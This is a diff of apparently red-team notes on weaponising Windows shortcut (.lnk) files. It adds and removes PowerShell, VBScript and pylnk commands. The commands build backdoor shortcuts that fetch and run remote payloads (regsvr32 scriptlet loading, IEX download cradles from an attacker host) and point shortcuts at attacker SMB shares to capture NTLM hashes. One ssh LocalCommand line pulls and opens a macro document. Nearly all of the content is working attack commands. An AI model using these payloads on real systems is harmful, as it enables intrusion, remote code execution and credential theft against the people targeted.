@@ -1,5 +1,8 @@
 # Living off the Land
 
+> [!INFO]
+> Windows shortcut link (`.lnk`) is often referred as **Shell Link**.
+
 ## 01 - Custom Icons
 
 ```
@@ -20,81 +23,58 @@ $ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> lport=<PORT> exit
 
 TODO: Remove timestamps in the .lnk file
 
-`$ cat pwsh_cmds.txt`
-
----
-
 ```powershell
-$shortcutPath = "C:\Users\" + $Env:USERNAME + "\Desktop\mal.lnk"
-$WshShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut($shortcutPath)
+$WScriptShell = New-Object -ComObject WScript.Shell
+$ShortcutPath = "C:\Users\" + $Env:USERNAME + "\Desktop\mal.lnk"
+$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
 $Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
-$Shortcut.Arguments = '/c regsvr32 /s /n /u /i:http://<IP>/implant.sct scrobj.dll'
+$Shortcut.Arguments = '/c regsvr32.exe /s /n /u /i:http://<IP>/implant.sct scrobj.dll'
 # $Shortcut.TargetPath = 'conhost.exe'
-# $Shortcut.Arguments = "--headless powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http://<IP>/implant.ps1`'))`"`""
+# $Shortcut.Arguments = "--headless powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http[s]://<attacker_IP>/implant.ps1`'))`"`""
 $Shortcut.Description = "A shortcut backdoor"
 # $Shortcut.IconLocation = 'C:\path\to\icon.ico'
 $Shortcut.IconLocation = 'shell32.dll,21'
-$Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload
+$Shortcut.HotKey = 'CTRL+C' # A hotkey to trigger the payload
 $Shortcut.WindowStyle = 7   # 1 - Normal, 3 - Maximized, 7 - Minimized
 $Shortcut.WorkingDirectory = "C:\Users\" + $Env:USERNAME + "\Public"
 $Shortcut.Save()
 ```
 
-### 2.2 - VBScript
-
-```vbscript
-Set ObjectWScript = WScript.CreateObject("WScript.Shell")
-
-' Arguments: target executable, target arguments, shortcut file
-stringTargetPath = WScript.Arguments(0)
-stringTargetArguments = WScript.Arguments(1)
-ShortcutFile = WScript.Arguments(2)
-
-Set objLink = ObjectWScript.CreateShortcut(ShortcutFile)
-
-objLink.TargetPath = stringTargetPath
-objLink.Arguments = stringTargetArguments
-objLink.Description = "A shortcut backdoor"
-' objLink.IconLocation = "shell32.dll,21"
-objLink.WindowStyle = 7
-' objLink.WorkingDirectory = "C:\Users\Public"
-objLink.Save
-```
-
-To execute the script with `wine` by generating a shortcut `.lnk` file.
-
-```
-$ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\conhost.exe" "--headless powershell.exe -nop -NonI -Nologo -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http[s]://<IP>:<PORT>/implant.ps1'))""" shortcut_file.lnk
-
-$ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\cmd.exe" "/c powershell.exe -nop -NonI -Nologo -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http[s]://<IP>:<PORT>/implant.ps1'))""" shortcut_file.lnk
-```
-
 ## 03 - Use Cases
 
+### 3.1 - Hidden file
+
 ```
-$ wine wscript '//Nologo' '//B' generate_lnk.vbs "C:\Windows\System32\conhost.exe" "--headless powershell -ep bypass -f implant.ps1" shortcut_file.lnk
+$ wine64 attrib.exe +h implant.ps1
+
+$ wine64 attrib.exe
+
+$ wine64 cmd.exe /c dir /a:h
+```
+
+```
+$ pylnk c C:\Windows\System32\conhost.exe -a "powershell.exe -ep bypass -f implant.ps1" shortcut_file.lnk
 ```
 
 ### 3.2 - Capture NTLM Relay
 
 ```
-$ wine wscript '//Nologo' '//B' generate_lnk.vbs "file://<attacker_IP>/@snare" "" file.lnk
+$ pylnk c \\<attacker_IP>\<share_name>\@snare.txt shortcut_file.lnk
 
-$ wine wscript '//Nologo' '//B' generate_lnk.vbs "\\\\<attacker_IP>\\snare" "" file.lnk
+$ pylnk c \\<attacker_IP>\<share_name>\snare.txt shortcut_file.lnk
 ```
 
 Scriptlet file
 
 ```
-$ wine wscript '//Nologo' '//B' generate_lnk.vbs "regsvr32" "/s /u /i://<attacker_IP>/@snare scrobj.dll" file.lnk
+$ pylnk c C:\Windows\System32\regsvr32.exe -a "/s /u /i://<attacker_IP>/@snare scrobj.dll" implant.lnk
+```
+
+```
+$ pylnk c C:\Windows\System32\OpenSSH\ssh.exe -a "\\<attacker_IP>\key.pem root@<IP>" implant.lnk
 ```
 
 TODO: Provide use cases if any (refer to the link for SSH)
-
-```
-$ wine wscript '//Nologo' '//B' generate_lnk.vbs "ssh" "-i \\\\<attacker_IP>\\key.pem root@<IP>"
-```
 
 ```
 C:\Windows\System32\OpenSSH\ssh.exe -o "PermitLocalCommand=yes" -o "LocalCommand=scp <username>@<attacker_IP>:macro_document.doc %AppData%\Microsoft\Templates\macro_document.doc\. && %AppData%\Microsoft\Templates\macro_document.doc" <username>@<attacker_IP>
@@ -115,7 +95,7 @@ C:\Windows\System32\OpenSSH\ssh.exe -o "PermitLocalCommand=yes" -o "LocalCommand
 
 - [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Web Drive-by/Linux/C2 Frameworks|Metasploit: Web Delivery]]
 
-### Github
+### Source Repositories
 
 - [rvrsh3ll: Create-HotKeyLNK.ps1](https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Create-HotKeyLNK.ps1)
 
